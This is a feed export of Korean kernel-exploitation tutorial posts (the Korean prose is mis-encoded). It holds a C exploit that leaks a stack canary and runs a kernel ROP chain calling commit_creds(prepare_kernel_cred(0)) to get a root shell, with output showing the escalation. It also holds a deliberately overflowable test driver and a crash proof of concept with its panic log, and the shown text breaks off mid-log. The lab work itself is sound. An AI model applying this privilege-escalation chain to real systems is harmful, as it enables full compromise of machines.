filename at all, and QEMU executed a ROM full of no-op instructions until it fell off the end(3) Your guest kernel has a bug and crashed by jumping off into nowhereThis is almost always one of the first two, so check your command line and that you are using the right type of kernel for this machine.If you think option (3) is likely then you can try debugging your guest with the -d debug options; in particular -d guest_errors will cause the log to include a dump of the guest register state at this point.Execution cannot continue; stopping here.</code></pre></br><p>ì‘ì„±í•œ ê³µê²©ì½”ë“œë¥¼ í† ëŒ€ë¡œ ê³µê²©ì„ ìˆ˜í–‰í•´ë³¸ ê²°ê³¼ ì˜ë„í•˜ì˜€ë˜ ë°”ì™€ ê°™ì´ ì‹¤í–‰íë¦„ì„ ë‹´ë‹¹í•˜ëŠ” ë ˆì§€ìŠ¤í„° RIPê°€ ë³€ì¡°ëœ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆì—ˆë‹¤. ë§Œì•½ ìŠ¤íƒ ì¹´ë‚˜ë¦¬ì˜ ê°’ì´ ì¼ì¹˜í•˜ì§€ ì•Šì•˜ë‹¤ë©´ ë‹¤ìŒê³¼ ê°™ì€ í˜•íƒœì˜ ì»¤ë„ íŒ¨ë‹‰ì´ ì•„ë‹Œ Stack Smashing Detectedì™€ ê°™ì€ ë‹¤ë¥¸ í˜•íƒœì˜ ì •ë³´ë¥¼ ë³´ì—¬ì£¼ì—ˆì„ ê²ƒì´ë‹¤. ê·¸ëŸ¬ë¯€ë¡œ ì¶”ì¶œí•œ ì¹´ë‚˜ë¦¬ì˜ ê°’ì€ ì •ìƒì ì¸ í˜•íƒœì˜ ì¹´ë‚˜ë¦¬ì´ë©° SSPë¥¼ ìš°íšŒí•˜ì—¬ ì‹¤í–‰íë¦„ì„ ë³€ì¡°í•  ìˆ˜ ìˆë‹¤ëŠ” ê²°ë¡ ì„ ë‚´ë ¸ë‹¤.</p><p></br></br></p><h2 id="ì·¨ì•½ì -ê³µê²©"><a href="#ì·¨ì•½ì -ê³µê²©" class="headerlink" title="ì·¨ì•½ì  ê³µê²©"></a>ì·¨ì•½ì  ê³µê²©</h2><p>ë¶„ì„ê³¼ì •ì„ í†µí•´ ì‚¬ìš©ìì˜ ì…ë ¥(untrusted input)ì„ í†µí•´ ì‹¤í–‰íë¦„ì„ ë³€ì¡°í•  ìˆ˜ ìˆìŒì„ í™•ì¸í•˜ì˜€ë‹¤. ì´ëŸ¬í•œ ì •ë³´ë“¤ì„ í† ëŒ€ë¡œ ê³µê²©ìì—ê²Œ ìœ ì˜ë¯¸í•œ í˜•íƒœì˜ ê³µê²©ì´ ë  ìˆ˜ ìˆë„ë¡ ì–´ë– í•œ í˜•íƒœë¡œ ê³µê²©ì„ ì§„í–‰í•  ê²ƒì¸ê°€ì— ëŒ€í•´ì„œ ì‹œë‚˜ë¦¬ì˜¤ë¥¼ ì‘ì„±í•˜ê² ë‹¤.</p><p>ê°€ì¥ íŒŒê¸‰ë ¥ìˆê³  ê³µê²©ìì—ê²Œ ììœ ë„ê°€ ë†’ì€ ë°©ë²•ì€ ë¦¬ëˆ…ìŠ¤(linux) ê¸°ë°˜ì˜ ì»¤ë„ì„ ê³µê²©í•˜ëŠ” ê²ƒì´ê¸°ì— ë£¨íŠ¸ ê¶Œí•œì˜ ì‰˜(shell)ì„ íšë“í•˜ëŠ” ê²ƒìœ¼ë¡œ ë³¼ ìˆ˜ ìˆë‹¤. ë‹¤ìŒê³¼ ê°™ì€ ê³µê²©ì´ ì´ë£¨ì–´ì§€ê¸° ìœ„í•´ì„œëŠ” ìš°ì„ ì ìœ¼ë¡œ ì§„í–‰ë˜ì–´ì•¼ í•˜ëŠ” ê²ƒì´ ìœ ì € ê¶Œí•œì„ ë£¨íŠ¸ ê¶Œí•œìœ¼ë¡œ ìƒìŠ¹(ê¶Œí•œ ìƒìŠ¹)ì„ ì¼ìœ¼ì¼œì•¼ í•œë‹¤. </p></br><h3 id="ê³µê²©-ì‹œë‚˜ë¦¬ì˜¤"><a href="#ê³µê²©-ì‹œë‚˜ë¦¬ì˜¤" class="headerlink" title="ê³µê²© ì‹œë‚˜ë¦¬ì˜¤"></a>ê³µê²© ì‹œë‚˜ë¦¬ì˜¤</h3><pre><code>STEP1. stack canary ìœ ì¶œ(leak) STEP2. commit_creds(prepare_kernel_cred(0))ì„ í†µí•œ ê¶Œí•œ ìƒìŠ¹STEP3. ì‚¬ìš©ì ëª¨ë“œ(user mode)ë¡œì˜ ì „í™˜STEP4. shell íšë“</code></pre><p>í•´ë‹¹ ì‹œë‚˜ë¦¬ì˜¤ì˜ ê²½ìš° ì§€ê¸ˆê¹Œì§€ ì‘ì„±í•´ì™”ë˜ ì¼ë°˜ì ì¸ ìµìŠ¤í”Œë¡œì‡ê³¼ ìœ ì‚¬í•˜ë‹¤. SMEP, SMAPì´ ì ìš©ë˜ì–´ ìˆìœ¼ë¯€ë¡œ ì‹œë‚˜ë¦¬ì˜¤ì— í•´ë‹¹í•˜ëŠ” í˜ì´ë¡œë“œë¥¼ Kernel ROPë¥¼ ê¸°ë°˜ìœ¼ë¡œ í•˜ì—¬ ì§„í–‰í•˜ë©° SSPê°€ ì ìš©ë˜ì–´ ìˆìœ¼ë¯€ë¡œ stack canaryì˜ ê°’ì„ ê³ ë ¤í•˜ì—¬ ê³µê²©ì„ ìˆ˜í–‰í•˜ì—¬ì•¼ í•œë‹¤. ê·¸ëŸ¬ë¯€ë¡œ ìš°ì„ ì ìœ¼ë¡œ STEP1ì— í•´ë‹¹í•˜ëŠ” leakì„ ë¨¼ì € ìˆ˜í–‰í•˜ì—¬ í•´ë‹¹ ê°’ì„ í† ëŒ€ë¡œ í˜ì´ë¡œë“œë¥¼ ì‘ì„±í•´ì•¼ í•œë‹¤.</p></br><h3 id="ê°€ì ¯-êµ¬ì„±"><a href="#ê°€ì ¯-êµ¬ì„±" class="headerlink" title="ê°€ì ¯ êµ¬ì„±"></a>ê°€ì ¯ êµ¬ì„±</h3><p>ê°€ì ¯ êµ¬ì„±ì˜ ê²½ìš° <a href="https://gaegaegae.github.io/2021/09/30/linux-kernel-exploit-bypassing-smep//#ê°€ì ¯-êµ¬ì„±">Bypassing SMEP</a>ì— ì‘ì„±í•œ í˜•íƒœì™€ ë™ì¼í•˜ê¸°ì— í•´ë‹¹ ê³¼ì •ì˜ ê¸°ì¬ëŠ” ìƒëµí•˜ë„ë¡ í•˜ê² ë‹¤.</p></br><h3 id="ê°€ì ¯-ì¶”ì¶œ"><a href="#ê°€ì ¯-ì¶”ì¶œ" class="headerlink" title="ê°€ì ¯ ì¶”ì¶œ"></a>ê°€ì ¯ ì¶”ì¶œ</h3><p>ê°€ì ¯ ì¶”ì¶œì˜ ê²½ìš° <a href="https://gaegaegae.github.io/2021/09/30/linux-kernel-exploit-bypassing-smep//#ê°€ì ¯-ì¶”ì¶œ">Bypassing SMEP</a>ì— ì‘ì„±í•œ í˜•íƒœì™€ ë™ì¼í•˜ê¸°ì— í•´ë‹¹ ê³¼ì •ì˜ ê¸°ì¬ëŠ” ìƒëµí•˜ë„ë¡ í•˜ê² ë‹¤.</p></br><h3 id="ê³µê²©ì½”ë“œ"><a href="#ê³µê²©ì½”ë“œ" class="headerlink" title="ê³µê²©ì½”ë“œ"></a>ê³µê²©ì½”ë“œ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;sys/stat.h&gt;<br>#include &lt;fcntl.h&gt;<br>#include &lt;stdint.h&gt;<br><br>struct register_val &#123;<br>    uint64_t user_rip;<br>    uint64_t user_cs;<br>    uint64_t user_rflags;<br>    uint64_t user_rsp;<br>    uint64_t user_ss;<br>&#125; __attribute__((packed));<br><br>struct register_val rv;<br><br>void backup_rv(void) &#123;<br>    asm(&quot;mov rv+8, cs;&quot;<br>        &quot;pushf; pop rv+16;&quot;<br>        &quot;mov rv+24, rsp;&quot;<br>        &quot;mov rv+32, ss;&quot;<br>       );<br>&#125;<br><br>void shell() &#123;<br>    execl(&quot;/bin/sh&quot;, &quot;sh&quot;, NULL);<br>&#125;<br><br>int main() &#123;<br>    int fd;<br>    size_t payload[20] = &#123;0, &#125;;<br>    size_t *canary[2] = &#123;0, &#125;;<br>    int i = 0;<br>    <br>    void *commit_creds = 0xffffffff8108e9f0;<br>    void *prepare_kernel_cred = 0xffffffff8108ec20;<br><br>    fd = open(&quot;/dev/test&quot;, O_RDWR);<br><br>    read(fd, canary, sizeof(canary));<br>    printf(&quot;canary = %lx\n&quot;, canary[1]);<br><br>    backup_rv();<br><br>    payload[i++] = canary[1];<br>    payload[i++] = canary[1];<br>    payload[i++] = canary[1];<br>    payload[i++] = canary[1];<br>    payload[i++] = canary[1];<br>    payload[i++] = 0xffffffff813fb9bc;    // pop rdi; ret;<br>    payload[i++] = 0;<br>    payload[i++] = prepare_kernel_cred;<br>    payload[i++] = 0xffffffff813f4eca;    // pop rcx; ret;<br>    payload[i++] = 0;<br>    payload[i++] = 0xffffffff81b2413b;    // mov rdi, rax; rep movs ...; ret;<br>    payload[i++] = commit_creds;<br>    payload[i++] = 0xffffffff81c00f58;    // swapgs; ret;<br>    payload[i++] = 0xffffffff810252b2;    // iretq; ret;<br>    payload[i++] = &amp;shell;<br>    payload[i++] = rv.user_cs;<br>    payload[i++] = rv.user_rflags;<br>    payload[i++] = rv.user_rsp;<br>    payload[i++] = rv.user_ss;<br><br>    write(fd, payload, sizeof(payload));<br><br>    close(fd);<br><br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure></br><h3 id="ê³µê²©ê²°ê³¼"><a href="#ê³µê²©ê²°ê³¼" class="headerlink" title="ê³µê²©ê²°ê³¼"></a>ê³µê²©ê²°ê³¼</h3><pre><code>qemu-system-x86_64: warning: TCG doesn&#39;t support requested feature: CPUID.01H:ECX.vmx [bit 5]/ $ whoamiuser/ $ ./exploit canary = c6fd32469a343500/ # whoamiroot/ # </code></pre><p></br></br></p><h2 id="ì°¸ê³ "><a href="#ì°¸ê³ " class="headerlink" title="ì°¸ê³ "></a>ì°¸ê³ </h2><pre><code>b30w0lfë‹˜ì˜ ìš´ì˜ì²´ì œ(Operating System)DREAMHACK - Linux Kernel ExploitINFLEARN - ë¦¬ëˆ…ìŠ¤ ì»¤ë„ í•´í‚¹. Aë¶€í„° Zê¹Œì§€https://www.lazenca.net/pages/viewpage.action?pageId=25624859https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/linux-x64-calling-convention-stack-frame</code></pre><p></br></br></p><h2 id="í•œì¤„í‰"><a href="#í•œì¤„í‰" class="headerlink" title="í•œì¤„í‰"></a>í•œì¤„í‰</h2><pre><code>ğŸ—¡ï¸ âŒ ğŸ›¡ï¸</code></pre>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>exploit</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>mitigation</tag>
      
      <tag>smep</tag>
      
      <tag>smap</tag>
      
      <tag>ssp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Linux Kernel Exploit - Bypassing SMAP</title>
    <link href="/2021/10/02/linux-kernel-exploit-bypassing-smap/"/>
    <url>/2021/10/02/linux-kernel-exploit-bypassing-smap/</url>
    
    <content type="html"><![CDATA[<h2 id="Research-Linux-Kernel-Exploit-Bypassing-SMAP"><a href="#Research-Linux-Kernel-Exploit-Bypassing-SMAP" class="headerlink" title="[Research] Linux Kernel Exploit - Bypassing SMAP"></a>[Research] Linux Kernel Exploit - Bypassing SMAP</h2><p><img src="/img/penguinshot.png"></p><h2 id="ì„œë¡ "><a href="#ì„œë¡ " class="headerlink" title="ì„œë¡ "></a>ì„œë¡ </h2><p>í•´ë‹¹ í¬ìŠ¤íŠ¸ì—ì„œëŠ” Linux Kernel Basic ì‹œë¦¬ì¦ˆì˜ ì •ë³´ë¥¼ ê¸°ë°˜ìœ¼ë¡œ í•˜ì—¬ ë¦¬ëˆ…ìŠ¤ ì»¤ë„ì— ì ìš©ë˜ì–´ ìˆëŠ” ë³´í˜¸ê¸°ë²•(mitigation)ì„ í•˜ë‚˜ì”© ìš°íšŒí•˜ì—¬ ê³µê²©í•˜ëŠ” ê³¼ì •ì„ í¬ìŠ¤íŠ¸í•˜ë ¤ê³  í•œë‹¤. í•´ë‹¹ í¬ìŠ¤íŠ¸ì—ì„œëŠ” SMAP ë³´í˜¸ê¸°ë²•ì„ ì£¼ì œë¡œ í•˜ì—¬ í•´ë‹¹ ë³´í˜¸ê¸°ë²•ì´ ì–´ë– í•œ ë³´í˜¸ê¸°ë²•ì¸ì§€ ì´í•´í•˜ê³  ì´ë¥¼ ìš°íšŒí•˜ì—¬ ê³µê²©í•˜ëŠ” ë°©ë²•ì„ ì‘ì„±í•˜ë ¤ê³  í•œë‹¤.</p></br></br><h2 id="SMAP"><a href="#SMAP" class="headerlink" title="SMAP"></a>SMAP</h2></br><p><img src="/img/cr4.PNG"></p></br><p><b>SMAP(Supervisor Mode Access Prevention)</b>ì€ supervisor mode(ring0)ì—ì„œ íŠ¹ì • ì£¼ì†Œì— ìˆëŠ” ë°ì´í„°ë¥¼ ì ‘ê·¼í•  ê²½ìš° í•´ë‹¹ ì£¼ì†Œê°€ ë§Œì•½ user mode(ring3)ì˜ ë°ì´í„°ë¼ê³  í•  ê²½ìš° ì´ë¥¼ ì ‘ê·¼í•  ìˆ˜ ì—†ë„ë¡ í•˜ëŠ” ë³´í˜¸ê¸°ë²•ì´ë‹¤.</p></br><p>SMAPì€ CPUì˜ CR4 Registerì˜ SMAPì— í•´ë‹¹í•˜ëŠ” ë¶€ë¶„ì˜ ë¹„íŠ¸ë¥¼ í‚¤ê±°ë‚˜ ë”ìœ¼ë¡œ ì ìš©ì´ ê°€ëŠ¥í•˜ë‹¤. ë˜í•œ SMAPì´ ì ìš©ë˜ì–´ ìˆì„ ê²½ìš° Kernel ROPë¥¼ ì´ìš©í•˜ë©´ ìš°íšŒê°€ ê°€ëŠ¥í•˜ë‹¤. ì´ëŠ” ê²°ê³¼ì ìœ¼ë¡œ ì§€ë‚œ í¬ìŠ¤íŠ¸ì—ì„œì˜ ìµìŠ¤í”Œë¡œì‡ ì½”ë“œë¥¼ í†µí•´ì„œë„ ê³µê²©ìëŠ” ê¶Œí•œ ìƒìŠ¹ í›„ì˜ ì‰˜ íšë“ì´ ê°€ëŠ¥í•˜ë‹¤ëŠ” ê²ƒì„ ì˜ë¯¸í•œë‹¤. Kernel ROPë¥¼ í†µí•´ ìš°íšŒë¥¼ ì§„í–‰í•˜ì˜€ìŒìœ¼ë¡œ í•´ë‹¹ í¬ìŠ¤íŠ¸ì—ì„œëŠ” CR4 ë ˆì§€ìŠ¤í„°ì˜ ê°’ì„ ë³€ì¡°í•˜ëŠ” í˜•íƒœë¡œ ìµìŠ¤í”Œë¡œì‡ì„ ì§„í–‰í•´ë³´ë ¤ê³  í•œë‹¤.</p><p></br></br></p><h2 id="í™˜ê²½ë¶„ì„"><a href="#í™˜ê²½ë¶„ì„" class="headerlink" title="í™˜ê²½ë¶„ì„"></a>í™˜ê²½ë¶„ì„</h2><h3 id="start-sh"><a href="#start-sh" class="headerlink" title="start.sh"></a>start.sh</h3><pre><code>qemu-system-x86_64 \-m 512M \-kernel ./bzImage \-initrd  ./rootfs.cpio \-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet nokaslr&quot; \-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \-nographic  \-cpu qemu64,smep,smap \</code></pre><p>ë¶€íŒ… ìŠ¤í¬ë¦½íŠ¸ì˜ ê²½ìš° ë‹¤ìŒê³¼ ê°™ì€ í˜•íƒœë¡œ ì‘ì„±ë˜ì–´ ìˆë‹¤. ì ìš©ëœ ë³´í˜¸ê¸°ë²•ì„ í™•ì¸í•´ë³´ë©´ KASLRì˜ ê²½ìš°ëŠ” ë¹„í™œì„±í™” í•´ë‘ì—ˆìœ¼ë©° SMEPê³¼ SMAPì˜ ê²½ìš°ëŠ” í™œì„±í™” ë˜ì–´ ìˆë‹¤. </p><p></br></br></p><h2 id="ë°”ì´ë„ˆë¦¬-ë¶„ì„"><a href="#ë°”ì´ë„ˆë¦¬-ë¶„ì„" class="headerlink" title="ë°”ì´ë„ˆë¦¬ ë¶„ì„"></a>ë°”ì´ë„ˆë¦¬ ë¶„ì„</h2><h3 id="ë””ë°”ì´ìŠ¤-ë“œë¼ì´ë²„-ì†ŒìŠ¤ì½”ë“œ"><a href="#ë””ë°”ì´ìŠ¤-ë“œë¼ì´ë²„-ì†ŒìŠ¤ì½”ë“œ" class="headerlink" title="ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ ì†ŒìŠ¤ì½”ë“œ"></a>ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ ì†ŒìŠ¤ì½”ë“œ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">#include &lt;linux/input.h&gt;<br>#include &lt;linux/module.h&gt;<br>#include &lt;linux/init.h&gt;<br>#include &lt;linux/kernel.h&gt;<br>#include &lt;linux/miscdevice.h&gt;<br>#include &lt;linux/device.h&gt;<br>#include &lt;linux/slab.h&gt;<br>#include &lt;linux/uaccess.h&gt;<br>#include &lt;linux/string.h&gt;<br><br>MODULE_LICENSE(&quot;Dual BSD/GPL&quot;);<br>MODULE_AUTHOR(&quot;SAMPLE&quot;);<br><br>static ssize_t test_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos);<br><br>struct file_operations test_fops = &#123;<br>    .write  = test_write,<br>&#125;;<br><br>static struct miscdevice test_driver = &#123;<br>    .minor = MISC_DYNAMIC_MINOR,<br>    .name = &quot;test&quot;,<br>    .fops = &amp;test_fops,<br>&#125;;<br><br>static ssize_t test_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos) &#123;<br>    char arr[8] = &#123; [0 ... 7] = 0 &#125;;<br>    char *ptr;<br><br>    ptr = (char *)kmalloc(count, GFP_KERNEL);<br><br>    copy_from_user(ptr, buf, count);<br>    memcpy(arr, ptr, count);<br>    <br>    printk(&quot;arr : %x&quot;, arr[count-1]);  // prevent undefined behavior<br><br>    return 0;<br>&#125;<br><br><br>static int test_init(void) &#123;<br>    int result;<br><br>    result = misc_register(&amp;test_driver);<br><br>    return 0;<br>&#125;<br><br>static void test_exit(void) &#123;<br>    misc_deregister(&amp;test_driver);<br>&#125;<br><br>module_init(test_init);<br>module_exit(test_exit);<br></code></pre></td></tr></table></figure><p>í•´ë‹¹ ì†ŒìŠ¤ì½”ë“œì˜ ê²½ìš° ê³µê²© ë²¡í„°(attack vector)ê°€ ë  ìˆ˜ ìˆëŠ” ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ íŒŒì¼ì˜ ì†ŒìŠ¤ì½”ë“œì´ë‹¤. ì†ŒìŠ¤ì½”ë“œë¥¼ í™•ì¸í•´ë³¼ ê²½ìš° file_operations êµ¬ì¡°ì²´ ë‚´ë¶€ì—ì„œ write ì‹œìŠ¤í…œ ì½œì— ëŒ€ì‘í•˜ëŠ” ë™ì‘ë“¤ì„ ì •ì˜í•˜ê³  ìˆë‹¤.</p><p>ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ íŒŒì¼ì„ í† ëŒ€ë¡œ write ì‹œìŠ¤í…œ ì½œì„ í˜¸ì¶œí•˜ê²Œ ë  ê²½ìš° test_write() í•¨ìˆ˜ê°€ ì‹¤í–‰ëœë‹¤. í•´ë‹¹ í•¨ìˆ˜ê°€ ì‹¤í–‰ë  ê²½ìš° line30~line33ì— ì˜í•˜ì—¬ ì»¤ë„ì—ì„œ ë©”ëª¨ë¦¬ë¥¼ ë™ì í• ë‹¹í•œ í›„ ìœ ì €ì˜ì—­ì—ì„œì˜ ë©”ëª¨ë¦¬ë¥¼ í•´ë‹¹ ë°ì´í„°ì˜ í¬ê¸°ë§Œí¼ ë³µì‚¬í•˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</p><p>ì´ë¥¼ ê³ ë ¤í•´ë³´ë©´ ì‚¬ìš©ìê°€ ì…ë ¥í•œ ë°ì´í„°(untrusted input)ì˜ í¬ê¸°ë¥¼ ì œí•œí•˜ì§€ ì•ŠëŠ” ë¬¸ì œë¡œ ì¸í•´ì„œ ìŠ¤íƒ ë²„í¼ê¸°ë°˜ì˜ ì˜¤ë²„í”Œë¡œìš°ê°€ ë°œìƒí•  ê²ƒìœ¼ë¡œ ì˜ˆìƒëœë‹¤.</p><p></br></br></p><h2 id="ì·¨ì•½ì -ë¶„ì„"><a href="#ì·¨ì•½ì -ë¶„ì„" class="headerlink" title="ì·¨ì•½ì  ë¶„ì„"></a>ì·¨ì•½ì  ë¶„ì„</h2><p><b>ë°”ì´ë„ˆë¦¬ ë¶„ì„</b>ì—ì„œ ì‚¬ìš©ìì˜ ì…ë ¥ìœ¼ë¡œ ë¶€í„° ì‹¤í–‰íë¦„ì„ ë³€ì¡°í•  ê°€ëŠ¥ì„±ì´ ìˆìŒì„ í™•ì¸í•˜ì˜€ë‹¤. í•´ë‹¹ ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ë¥¼ í† ëŒ€ë¡œ write ì‹œìŠ¤í…œ ì½œì´ í˜¸ì¶œë˜ê²Œ ë  ê²½ìš° ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ì˜ ê²½ìš° ì‚¬ìš©ìì˜ ì…ë ¥(untrusted input)ì´ ë²„í¼ ì˜¤ë²„í”Œë¡œìš°ë¥¼ ë°œìƒì‹œí‚¤ê¸° ë•Œë¬¸ì´ë‹¤. ì˜ˆìƒí•œ ê²°ê³¼ê°€ ë§ëŠ”ê°€ì— ëŒ€í•´ì„œ í™•ì¸í•´ë³¼ í•„ìš”ê°€ ìˆë‹¤.</p></br><h3 id="ê³µê²©-ì½”ë“œ"><a href="#ê³µê²©-ì½”ë“œ" class="headerlink" title="ê³µê²© ì½”ë“œ"></a>ê³µê²© ì½”ë“œ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;sys/stat.h&gt;<br>#include &lt;fcntl.h&gt;<br>#include &lt;stdint.h&gt;<br><br><br>int main() &#123;<br>    int fd;<br>    size_t payload[18] = &#123;0, &#125;;<br>    <br><br>    fd = open(&quot;/dev/test&quot;, O_RDWR);<br><br><br>    memset(payload, 0x41, 40);<br>    payload[4] = 0x4343434343434343;   <br><br><br>    write(fd, payload, sizeof(payload));<br><br>    close(fd);<br><br>    return 0;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ë¥¼ ì œì–´í•˜ëŠ” ì½”ë“œë¥¼ ì‘ì„±í•˜ì˜€ë‹¤. ë²„í¼ì— ë°ì´í„°ë¥¼ ì–´ëŠì •ë„ ì‘ì„±í•´ì•¼ Return Addressë¥¼ ì»¨íŠ¸ë¡¤ í•  ìˆ˜ ìˆëŠ”ê°€ë¥¼ íŒŒì•…í•˜ê¸° ìœ„í•´ì„œ ì—°ì†ì ì¸ í˜•íƒœì˜ ì…ë ¥ì¸ â€œAAAâ€¦ACCCâ€¦Câ€¦â€ë¥¼ ì…ë ¥í•˜ì˜€ë‹¤. ë§Œì•½ RIPê°€ í•´ë‹¹ ì…ë ¥ê°’ ì¤‘ í•˜ë‚˜ì˜ ê°’ìœ¼ë¡œ ë³€ì¡°ëœë‹¤ë©´ ì´ëŠ” ì‚¬ìš©ìì˜ ì…ë ¥ìœ¼ë¡œ ì‹¤í–‰íë¦„ì„ ë³€ì¡°í•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ìœ¼ë¡œ ë³¼ ìˆ˜ ìˆë‹¤. ì°¸ê³ ë¡œ ìŠ¤íƒ ì¹´ë‚˜ë¦¬ëŠ” ë¹„í™œì„±í™” ìƒíƒœì´ë‹¤.</p></br><h3 id="ê³µê²©-ê²°ê³¼"><a href="#ê³µê²©-ê²°ê³¼" class="headerlink" title="ê³µê²© ê²°ê³¼"></a>ê³µê²© ê²°ê³¼</h3><pre><code>qemu-system-x86_64: warning: TCG doesn&#39;t support requested feature: CPUID.01H:ECX.vmx [bit 5]/ $ ./crash [    5.845709] arr : 0[    5.847836] general protection fault: 0000 [#1] SMP NOPTI[    5.850227] CPU: 0 PID: 69 Comm: crash Tainted: G           O      5.8.5 #1[    5.851984] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014[    5.854040] RIP: 0010:0x4343434343434343[    5.854920] Code: Bad RIP value.[    5.855637] RSP: 0018:ffffc9000019fed8 EFLAGS: 00000246[    5.859450] RAX: 0000000000000000 RBX: 4141414141414141 RCX: 0000000020727261[    5.859996] RDX: 4141414141414141 RSI: ffffffff82b2bba0 RDI: ffffffff82b2bfa0[    5.860456] RBP: 4141414141414141 R08: 0000000030203a20 R09: 0000000000000007[    5.862713] R10: 0000000000000045 R11: ffffffff82b2bba7 R12: 4141414141414141[    5.863229] R13: 0000000000000090 R14: ffffc9000019ff10 R15: 00007fff25db9ea0[    5.863786] FS:  00000000011ce880(0000) GS:ffff88801f000000(0000) knlGS:0000000000000000[    5.864440] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033[    5.865603] CR2: 0000000000459f70 CR3: 000000001da40000 CR4: 00000000003006f0[    5.866234] Call Trace:[    5.867406]  ? do_syscall_64+0x3e/0x70[    5.868196]  ? entry_SYSCALL_64_after_hwframe+0x44/0xa9[    5.869328] Modules linked in: test(O)[    5.870959] ---[ end trace 0fcca97aa748deff ]---[    5.871920] RIP: 0010:0x4343434343434343[    5.872678] Code: Bad RIP value.[    5.873270] RSP: 0018:ffffc9000019fed8 EFLAGS: 00000246[    5.873831] RAX: 0000000000000000 RBX: 4141414141414141 RCX: 0000000020727261[    5.874345] RDX: 4141414141414141 RSI: 